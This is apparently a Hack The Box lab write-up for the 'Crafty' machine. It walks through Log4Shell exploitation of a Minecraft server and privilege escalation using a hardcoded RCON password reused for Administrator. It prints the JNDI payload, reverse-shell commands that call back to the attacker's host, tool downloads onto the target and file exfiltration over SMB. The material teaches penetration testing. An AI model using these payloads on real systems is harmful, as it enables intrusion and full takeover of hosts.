# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty]
└─$ nmap -sC -sV -Pn 10.10.11.249 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 23:28 AEST
Nmap scan report for 10.10.11.249
Host is up (0.31s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.27 seconds
```
Let's add `crafty.htb` into our `/etc/hosts`

By continue to check the other potential ports:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty]
└─$ nmap -p- --min-rate 10000 10.10.11.249
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 23:41 AEST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.33s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
25565/tcp open  minecraft

Nmap done: 1 IP address (1 host up) scanned in 14.85 seconds

┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty]
└─$ nmap -p 80,25565 -sCV 10.10.11.249
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 23:42 AEST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.48s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
```
Great, we can get the version of service `minecraft Minecraft 1.16.5`
# Page check
**crafty.htb**
![[images/Screenshot 2025-07-17 at 1.32.43 PM.png]]
Very fancy index page, and there is another domain `play.crafty.htb`

But when I wanna check the page of `play.crafty.htb`, it has been redirected to `crafty.htb`

# Log4j
By searching about `minecraft Minecraft 1.16.5`, we can find something interesting here
![](images/Pasted%20image%2020250717234422.png)
It direct to the infamous `log4j` vulnerability
Then we can follow the blog to run the exploiting process
```
https://github.com/kozmer/log4j-shell-poc.git
```
As a prerequisite I needed to download a specific version of JDK they require you to make an account but you can bypass that with this command:
```
sudo wget -c — no-cookies — no-check-certificate — header “Cookie: oraclelicense=accept-securebackup-cookie” https://download.oracle.com/otn/java/jdk/8u20-b26/jdk-8u20-linux-x64.tar.gz
```
Or you can use your oracle account to get the version of java

Also we need to change a little in this exploit script, we need to change the `/bin/bash` to `cmd.exe` because of the target machine is Windows
![](images/Pasted%20image%2020250717234830.png)
Then run the exploit script
```
python3 poc.py --userip 10.10.14.17 --webport 80 --lport 4444
```

To exploit `Log4Shell` on `Minecraft`, I need to send a specific message to the commands / chat function. To interact with the `Minecraft` server, I’ll need a client.
` Minecraft-Console-Client` would be a good choice for us
```
./MinecraftClient-20250522-285-linux-arm64 wither

Minecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam
GitHub build 285, built on 2025-05-22 from commit f785f50
Settings file MinecraftClient.ini has been generated.

MCC is running with default settings.
MCC uses Sentry to log errors. You can opt-out by setting the EnableSentry option in the configuration file to false.
Password(invisible): 
You chose to run in offline mode.
Server IP : 
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
>                             
```

Then we need to send `${jndi:ldap://10.10.14.17:1389/a}`, then we can get the feedback
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty/log4j-shell-poc]
└─$ python3 poc.py --userip 10.10.14.17 --webport 80 --lport 4444


[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.17:1389/a}

[+] Starting Webserver on port 80 http://0.0.0.0:80
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.10.14.17:80/Exploit.class
10.10.11.249 - - [18/Jul/2025 00:05:55] "GET /Exploit.class HTTP/1.1" 200 -
Send LDAP reference result for a redirecting to http://10.10.14.17:80/Exploit.class
10.10.11.249 - - [18/Jul/2025 00:06:00] "GET /Exploit.class HTTP/1.1" 200 -
Send LDAP reference result for a redirecting to http://10.10.14.17:80/Exploit.class
10.10.11.249 - - [18/Jul/2025 00:06:05] "GET /Exploit.class HTTP/1.1" 200 -


┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty/log4j-shell-poc]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.249] 49687
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>
```

# Privilege Escalation
By enumerating the file system, we can find some interesting files.
```

c:\Users\svc_minecraft\server>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\server

10/26/2023  06:37 PM    <DIR>          .
10/26/2023  06:37 PM    <DIR>          ..
11/14/2023  11:00 PM                 2 banned-ips.json
11/14/2023  11:00 PM                 2 banned-players.json
10/24/2023  01:48 PM               183 eula.txt
07/16/2025  08:23 PM    <DIR>          logs
11/15/2023  12:22 AM                 2 ops.json
10/27/2023  02:48 PM    <DIR>          plugins
10/24/2023  01:43 PM        37,962,360 server.jar
11/14/2023  11:00 PM             1,130 server.properties
07/16/2025  09:09 PM               105 usercache.json
10/24/2023  01:51 PM                 2 whitelist.json
07/16/2025  09:09 PM    <DIR>          world
               8 File(s)     37,963,786 bytes
               5 Dir(s)   3,745,067,008 bytes free

```

I suspect that `server.jar` is a `Minecraft` server. I’ll take a file hash:
```
PS C:\Users\svc_minecraft\server> Get-FileHash -algorithm MD5 server.jar
Get-FileHash -algorithm MD5 server.jar

Algorithm       Hash                                                                   Path                            
---------       ----                                                                   ----                            
MD5             C10B74188EFC4ED6960DB49C9ADE50CE                                       C:\Users\svc_minecraft\server...

```
Then we can found something useful from `VirusTotal`
```
https://www.virustotal.com/gui/file/58f329c7d2696526f948470aa6fd0b45545039b64cb75015e64c12194b373da6
```
![](images/Pasted%20image%2020250718001908.png)
There is another plugin `playercounter-1.0-SNAPSHOT.jar`
```
PS C:\Users\svc_minecraft\server\plugins> ls
ls


    Directory: C:\Users\svc_minecraft\server\plugins


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/27/2023   2:48 PM           9996 playercounter-1.0-SNAPSHOT.jar   
```
Then let's download it to our local machine by using a `smbserver`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty]
└─$ smbserver.py share . -smb2support -username wither -password wither
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

PS C:\Users\svc_minecraft\server\plugins> net use \\10.10.14.17\share /u:wither wither
net use \\10.10.14.17\share /u:wither wither
The command completed successfully.

PS C:\Users\svc_minecraft\server\plugins> copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.17\share\
copy playercounter-1.0-SNAPSHOT.jar \\10.10.14.17\share\
```
Then let's check the hash to make sure the file is not broken
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty]
└─$ md5sum playercounter-1.0-SNAPSHOT.jar
349f6584e18cd85fc9e014da154efe03  playercounter-1.0-SNAPSHOT.jar
```

Let's use `jd-gui` to decompile this jar package `
```
jd-gui playercounter-1.0-SNAPSHOT.jar
```

![](images/Pasted%20image%2020250718002947.png)
This is a small project of java

**plugin.yml**
```
name: playercounter  
version: '1.0-SNAPSHOT'  
main: htb.crafty.playercounter.Playercounter  
api-version: '1.20'
```

**Playercounter.class**
```
package htb.crafty.playercounter;  
  
import java.io.IOException;  
import java.io.PrintWriter;  
import net.kronos.rkon.core.Rcon;  
import net.kronos.rkon.core.ex.AuthenticationException;  
import org.bukkit.plugin.java.JavaPlugin;  
  
public final class Playercounter extends JavaPlugin {  
  public void onEnable() {  
    Rcon rcon = null;  
    try {  
      rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());  
    } catch (IOException e) {  
      throw new RuntimeException(e);  
    } catch (AuthenticationException e2) {  
      throw new RuntimeException(e2);  
    }   
    String result = null;  
    try {  
      result = rcon.command("players online count");  
      PrintWriter writer = new PrintWriter("C:\\inetpub\\wwwroot\\playercount.txt", "UTF-8");  
      writer.println(result);  
    } catch (IOException e3) {  
      throw new RuntimeException(e3);  
    }   
  }  
    
  public void onDisable() {}  
}
```

It is connecting to `rkon` port 27015 with password `"s67u84zKq8IXw"`.
```
rkon is a public library for the Source RCON Protocol, designed for game servers. From the docs:

The Source RCON Protocol is a TCP/IP-based communication protocol used by Source Dedicated Server, which allows console commands to be issued to the server via a “remote console”, or RCON. The most common use of RCON is to allow server owners to control their game servers without direct access to the machine the server is running on. In order for commands to be accepted, the connection must first be authenticated using the server’s RCON password, which can be set using the console variable rcon_password.
```

Since I have no access to `SMB, LDAP, WinRM, Kerberos` or any other authenticated Windows service, I can't check this password from my host. We can use `RunasCs` to help us get the administrator shell.
```
PS C:\programdata> wget http://10.10.14.17/RunasCs.exe -outfile RunasCs.exe

PS C:\programdata> .\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"
.\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"

crafty\administrator

.\RunasCs.exe Administrator s67u84zKq8IXw cmd -r 10.10.14.17:443
```

Then we can get the administrator shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Crafty/log4j-shell-poc]
└─$ nc -lnvp 443         
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.249] 49690
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

# Description

As a simple machine I thought it was interesting to design, even considering using minecraft to pull out the log4j bug.